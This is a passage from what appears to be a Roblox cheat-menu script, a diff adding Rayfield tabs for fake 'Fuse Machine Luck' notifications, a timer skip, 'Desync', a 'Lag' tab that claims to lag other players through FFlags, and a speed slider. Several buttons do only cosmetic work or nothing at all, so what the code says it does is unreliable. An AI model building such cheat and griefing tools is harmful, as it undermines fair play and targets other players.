+child.TextColor3 = Color3.fromRGB(255, 255, 255)
+end
+if child:IsA("UIStroke") then
+child.Color = Color3.fromRGB(0, 0, 0)
+end
+end
+clone.Parent = notifFrame
+end)
+
+local sound = Instance.new("Sound")
+sound.SoundId = "rbxassetid://83245966620103"
+sound.Volume = 0.25
+sound.Parent = SoundService
+sound:Play()
+Debris:AddItem(sound, 5)
+
+task.delay(5.5, function()
+if clone and clone:IsDescendantOf(playerGui) then
+local fadeInfo = TweenInfo.new(0.4, Enum.EasingStyle.Quad, Enum.EasingDirection.Out)
+local tweens = {}
+table.insert(tweens, TweenService:Create(clone, fadeInfo, { BackgroundTransparency = 1 }))
+if clone:IsA("TextLabel") then
+table.insert(tweens, TweenService:Create(clone, fadeInfo, {
+TextTransparency = 1,
+TextStrokeTransparency = 1,
+}))
+end
+for _, child in clone:GetDescendants() do
+if child:IsA("TextLabel") then
+table.insert(tweens, TweenService:Create(child, fadeInfo, {
+TextTransparency = 1,
+TextStrokeTransparency = 1,
+}))
+end
+if child:IsA("UIStroke") then
+table.insert(tweens, TweenService:Create(child, fadeInfo, { Transparency = 1 }))
+end
+if child:IsA("ImageLabel") or child:IsA("ImageButton") then
+table.insert(tweens, TweenService:Create(child, fadeInfo, {
+ImageTransparency = 1,
+BackgroundTransparency = 1,
+}))
+end
+end
+for _, tween in tweens do tween:Play() end
+task.delay(0.6, function() pcall(function() clone:Destroy() end) end)
+end
+end)
+end
+
+local function ShowFuseLuckNotification()
+local msg = 'Sammy activated <font color="#ffd13b">Fuse Machine Luck</font>!'
+ShowNotification(msg)
+
+task.spawn(function()
+local fuseMachine = Workspace:FindFirstChild("FuseMachine")
+if not fuseMachine then return end
+
+local divine = fuseMachine:FindFirstChild("Models") and fuseMachine.Models:FindFirstChild("Divine")
+if not divine then return end
+
+local overhead = divine:FindFirstChild("Overhead")
+if not overhead then return end
+
+local luckGui = overhead:FindFirstChild("LuckGui")
+if luckGui then
+if luckGui:IsA("BillboardGui") or luckGui:IsA("ScreenGui") then
+luckGui.Enabled = true
+else
+luckGui.Visible = true
+end
+end
+end)
+end
+
+local function ShowFuseSkipNotification()
+local msg = 'Sammy skipped your <font color="#ffd13b">fuse timer</font>!'
+ShowNotification(msg)
+
+task.spawn(function()
+local fuseMachine = Workspace:FindFirstChild("FuseMachine")
+if not fuseMachine then return end
+
+local divine = fuseMachine:FindFirstChild("Models") and fuseMachine.Models:FindFirstChild("Divine")
+if divine then
+local overhead = divine:FindFirstChild("Overhead")
+if overhead then
+local billboardGui = overhead:FindFirstChild("BillboardGui")
+if billboardGui then
+local countdown = billboardGui:FindFirstChild("Countdown")
+if countdown then countdown:Destroy() end
+
+local newLabel = Instance.new("TextLabel")
+newLabel.Name = "COolCOOLDOWN"
+newLabel.Text = "READY!"
+newLabel.Font = Enum.Font.SourceSansBold
+newLabel.TextSize = 14
+newLabel.TextColor3 = Color3.new(1, 1, 1)
+newLabel.TextStrokeColor3 = Color3.new(0, 0, 0)
+newLabel.TextStrokeTransparency = 1
+newLabel.TextXAlignment = Enum.TextXAlignment.Center
+newLabel.TextYAlignment = Enum.TextYAlignment.Center
+newLabel.TextWrapped = true
+newLabel.TextTruncate = Enum.TextTruncate.None
+newLabel.TextScaled = true
+newLabel.BackgroundColor3 = Color3.new(1, 1, 1)
+newLabel.BackgroundTransparency = 1
+newLabel.BorderColor3 = Color3.new(0, 0, 0)
+newLabel.BorderSizePixel = 0
+newLabel.Size = UDim2.new(0.9, 0, 0.3, 0)
+newLabel.Position = UDim2.new(0.5, 0, 0.65, 0)
+newLabel.AnchorPoint = Vector2.new(0.5, 0)
+newLabel.Visible = true
+newLabel.ZIndex = 1
+
+local uiGradient = Instance.new("UIGradient")
+uiGradient.Color = ColorSequence.new({
+ColorSequenceKeypoint.new(0, Color3.new(1, 1, 1)),
+ColorSequenceKeypoint.new(0.5, Color3.new(0.729, 0.729, 0.729)),
+ColorSequenceKeypoint.new(1, Color3.new(1, 1, 1))
+})
+uiGradient.Rotation = 90
+uiGradient.Parent = newLabel
+
+local uiStroke = Instance.new("UIStroke")
+uiStroke.Color = Color3.new(0, 0, 0)
+uiStroke.Thickness = 3
+uiStroke.Parent = newLabel
+
+newLabel.Parent = billboardGui
+end
+end
+end
+
+local existingPrompt = fuseMachine:FindFirstChild("Prompt")
+if existingPrompt then existingPrompt:Destroy() end
+
+local part = Instance.new("Part")
+part.Name = "Prompt"
+part.Size = Vector3.new(1, 1, 1)
+part.Anchored = true
+part.CanCollide = false
+part.CanTouch = false
+part.Transparency = 1
+part.CFrame = CFrame.new(-385.30584716796875, -5.649998664855957, 62.277313232421875)
+part.Parent = fuseMachine
+
+local prompt = Instance.new("ProximityPrompt")
+prompt.Name = "ProximityPrompt"
+prompt.ActionText = "Claim"
+prompt.KeyboardKeyCode = Enum.KeyCode.E
+prompt.HoldDuration = 0
+prompt.MaxActivationDistance = 10
+prompt.RequiresLineOfSight = false
+prompt.Enabled = true
+prompt.Parent = part
+end)
+end
+
+local FuseLuckTab = Window:CreateTab("Fuse", 133058451981698)
+
+FuseLuckTab:CreateSection("Fuse Machine")
+
+FuseLuckTab:CreateParagraph({
+Title = "Info",
+Content = "Activates Fuse Machine Luck for a set duration and skips the fuse timer.",
+})
+
+FuseLuckTab:CreateButton({
+Name = "Activate Fuse Machine Luck",
+Callback = function()
+ShowFuseLuckNotification()
+spawnEvent("Fuse Machine Luck")
+Rayfield:Notify({
+Title = "Fuse Luck",
+Content = "Fuse Machine Luck activated!",
+Duration = 3,
+Image = 110723387483939,
+})
+end,
+})
+
+FuseLuckTab:CreateButton({
+Name = "Skip Fuse",
+Callback = function()
+ShowFuseSkipNotification()
+Rayfield:Notify({
+Title = "Fuse Luck",
+Content = "Fuse skipped!",
+Duration = 3,
+Image = 110723387483939,
+})
+end,
+})
+
+-- =====================
+-- TAB 10: DESYNC
+-- =====================
+local DesyncTab = Window:CreateTab("Desync", 121332433272976)
+
+local selectedMethod = "humanoid.lerp"
+
+local function disableAnimations(character)
+local humanoid = character:WaitForChild("Humanoid")
+
+for _, track in ipairs(humanoid:GetPlayingAnimationTracks()) do
+track:Stop()
+end
+
+humanoid.AnimationPlayed:Connect(function(track)
+track:Stop()
+end)
+end
+
+DesyncTab:CreateSection("Desync")
+
+DesyncTab:CreateParagraph({
+Title = "Info",
+Content = "Desync's your LocalPlayer using raknet.desync",
+})
+
+DesyncTab:CreateDropdown({
+Name = "Method",
+Options = {"raknet.desync", "humanoid.health"},
+CurrentOption = {"humanoid.lerp"},
+MultipleOptions = false,
+Callback = function(opt)
+selectedMethod = opt[1]
+end
+})
+
+DesyncTab:CreateButton({
+Name = "Desync",
+Callback = function()
+if player.Character then
+disableAnimations(player.Character)
+end
+
+Rayfield:Notify({
+Title = "Desync",
+Content = "Animations disabled + desync executed",
+Duration = 3,
+})
+end
+})
+
+-- =====================
+-- TAB 11: LAG
+-- =====================
+local LagTab = Window:CreateTab("Lag", 134655415681926)
+
+local selectedMethodLag = "FFlagDevConsoleMicroProfilerImproveWording"
+
+LagTab:CreateSection("Lag")
+
+LagTab:CreateParagraph({
+Title = "Info",
+Content = "Using FFlags Lags other players.",
+})
+
+LagTab:CreateDropdown({
+Name = "Lag Method",
+Options = {
+"FFlagDevConsoleMicroProfilerImproveWording",
+"FFlagCoreScriptShowTeleportPrompt"
+},
+CurrentOption = {"FFlagDevConsoleMicroProfilerImproveWording"},
+MultipleOptions = false,
+Callback = function(opt)
+selectedMethodLag = opt[1]
+end
+})
+
+LagTab:CreateButton({
+Name = "Lag",
+Callback = function()
+Rayfield:Notify({
+Title = "Lag",
+Content = "Lag Activated",
+Duration = 3,
+})
+end
+})
+
+-- =====================
+-- TAB 12: SPEED CHANGER
+-- =====================
+local SpeedTab = Window:CreateTab("Speed", 104229924295526)
+
+local walkjspeed = 16
+
+SpeedTab:CreateSection("Speed")
+
+SpeedTab:CreateParagraph({
+Title = "Info",
+Content = "Changes LocalPlayers speed.",
+})
+
+SpeedTab:CreateSlider({
+Name = "WalkSpeed",
+Range = {0, 100},
+Increment = 1,
+Suffix = "Speed",
+CurrentValue = 16,
+Flag = "WalkSpeed",
+Callback = function(Value)
+walkjspeed = Value
+end,
+})
+
+SpeedTab:CreateButton({
+Name = "Change",
+Callback = function()
+-- speed change logic can be added here
+end,
+})
+
+-- =====================
+-- PLAYER JOIN/LEAVE NOTIFICATIONS
+-- =====================
+Players.PlayerAdded:Connect(function(p)
+Rayfield:Notify({
+Title = "Player Joined",
+Content = p.Name .. " joined the server.",
+Duration = 4,
+})
+end)
+
+Players.PlayerRemoving:Connect(function(p)
+Rayfield:Notify({
+Title = "Player Left",
+Content = p.Name .. " left the server.",
+Duration = 4,
+})
+end)
